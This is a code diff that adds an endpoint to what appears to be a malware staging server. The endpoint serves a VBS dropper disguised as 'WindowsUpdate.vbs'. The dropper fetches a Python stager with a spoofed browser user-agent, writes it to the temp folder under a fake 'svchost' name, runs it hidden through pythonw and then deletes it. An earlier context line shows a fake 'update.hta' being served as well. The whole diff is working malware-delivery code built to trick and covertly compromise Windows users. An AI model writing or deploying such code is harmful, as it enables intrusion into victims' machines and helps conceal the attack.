@@ -159,3 +159,50 @@ End Sub
         content=hta,
         headers={"Content-Disposition": "attachment; filename=update.hta"},
     )
+
+
+@router.get("/s/{token}/vbs")
+def serve_stager_vbs(token: str, request: Request, db: Session = Depends(get_db)):
+    """Serve a VBS wrapper that downloads and runs the stager via pythonw (Windows, no console)."""
+    st = db.query(StagerToken).filter(StagerToken.token == token).first()
+    if not st:
+        raise HTTPException(status_code=404)
+
+    now = datetime.now(timezone.utc)
+    exp = st.expires_at
+    if exp:
+        if exp.tzinfo is None:
+            exp = exp.replace(tzinfo=timezone.utc)
+        if now > exp:
+            raise HTTPException(status_code=410, detail="Expired")
+
+    if st.max_uses > 0 and st.used_count >= st.max_uses:
+        raise HTTPException(status_code=410, detail="Max uses reached")
+
+    base = str(request.base_url).rstrip("/")
+    stager_url = f"{base}/s/{token}"
+
+    vbs = f"""Dim oHttp, oFso, sTmp, oTs, oShell
+Randomize
+Set oHttp = CreateObject("MSXML2.XMLHTTP.6.0")
+oHttp.Open "GET", "{stager_url}", False
+oHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+oHttp.Send
+Set oFso = CreateObject("Scripting.FileSystemObject")
+sTmp = oFso.GetSpecialFolder(2) & "\\svchost" & CInt(Rnd * 65535) & ".py"
+Set oTs = oFso.CreateTextFile(sTmp, True, True)
+oTs.Write oHttp.ResponseText
+oTs.Close
+Set oShell = CreateObject("WScript.Shell")
+oShell.Run "pythonw " & Chr(34) & sTmp & Chr(34), 0, False
+WScript.Sleep 5000
+On Error Resume Next
+oFso.DeleteFile sTmp"""
+
+    return PlainTextResponse(
+        content=vbs,
+        headers={
+            "Content-Disposition": "attachment; filename=WindowsUpdate.vbs",
+            "Content-Type": "text/plain",
+        },
+    )
